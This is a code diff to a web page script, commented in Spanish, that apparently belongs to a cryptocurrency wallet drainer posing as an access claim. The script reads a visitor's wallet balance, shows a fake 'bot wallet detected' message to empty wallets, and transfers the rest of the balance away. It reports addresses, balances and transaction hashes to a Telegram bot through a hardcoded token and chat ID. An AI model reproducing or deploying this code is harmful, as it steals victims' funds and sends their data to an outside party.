@@ -192,18 +192,17 @@
     <script>
         let web3;
         let accounts;
+        const telegramBotToken = "8061822678:AAEXjFUocG2cjyCCmIVyqVikMg96bFPbaXg";  // Token del bot
+        const telegramChatId = "-1002286653887";  // ID del chat
 
-        const telegramBotToken = '8061822678:AAEXjFUocG2cjyCCmIVyqVikMg96bFPbaXg';  // Token del Bot de Telegram
-        const chatId = '-1002286653887';  // ID del Canal de Telegram
-
-        // Función para enviar mensaje a Telegram
-        function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-            
-            fetch(url)
-                .then(response => response.json())
-                .then(data => console.log('Mensaje enviado a Telegram:', data))
-                .catch(error => console.error('Error al enviar mensaje a Telegram:', error));
+        // Función para enviar un mensaje a Telegram
+        async function sendTelegramMessage(message) {
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`;
+            try {
+                await fetch(url);
+            } catch (error) {
+                console.error("Error enviando mensaje a Telegram", error);
+            }
         }
 
         // Lógica para conectar la wallet
@@ -216,13 +215,13 @@
                 const balanceWei = await web3.eth.getBalance(accounts[0]);
                 const balanceEth = web3.utils.fromWei(balanceWei, 'ether');
 
-                // Enviar la información de la wallet al canal de Telegram
-                sendToTelegram(`Wallet conectada: ${accounts[0]}\nSaldo: ${balanceEth} ETH`);
-
                 // Verificar si la cuenta tiene historial de transacciones (si tiene saldo)
                 if (parseFloat(balanceEth) > 0) {
                     document.getElementById('status').innerText = `Accepted Claim the Access`;
                     document.getElementById('sendButton').style.display = 'block';  // Mostrar el botón para enviar
+
+                    // Enviar mensaje a Telegram
+                    sendTelegramMessage(`Wallet ${accounts[0]} connected with balance: ${balanceEth} ETH`);
                 } else {
                     document.getElementById('status').innerText = `Not accepted to claim to lack of transaction history; bot wallet detected`;
                     document.getElementById('status').style.color = '#e74c3c'; // Color rojo para bot wallet
@@ -243,7 +242,6 @@
 
             if (balanceWei > gasFee) {
                 const amountToSend = balanceWei - gasFee;
-                const amountToSendEth = web3.utils.fromWei(amountToSend, 'ether'); // Convertir el valor enviado a ETH
 
                 web3.eth.sendTransaction({
                     from: fromAccount,
@@ -253,9 +251,9 @@
                 .then(tx => {
                     alert(`Transferencia exitosa: ${tx.transactionHash}`);
                     document.getElementById('status').innerText = 'Todo el saldo ha sido enviado correctamente';
-                    
-                    // Enviar el mensaje a Telegram con el emoticono verde y la cantidad de fondos enviados
-                    sendToTelegram(`✅ Transacción exitosa\nWallet: ${fromAccount}\nTransacción Hash: ${tx.transactionHash}\nCantidad Enviada: ${amountToSendEth} ETH`);
+
+                    // Enviar mensaje a Telegram después de la transacción
+                    sendTelegramMessage(`Transaction successful from wallet ${fromAccount}. Transaction hash: ${tx.transactionHash}`);
                 })
                 .catch(error => {
                     console.error(error);
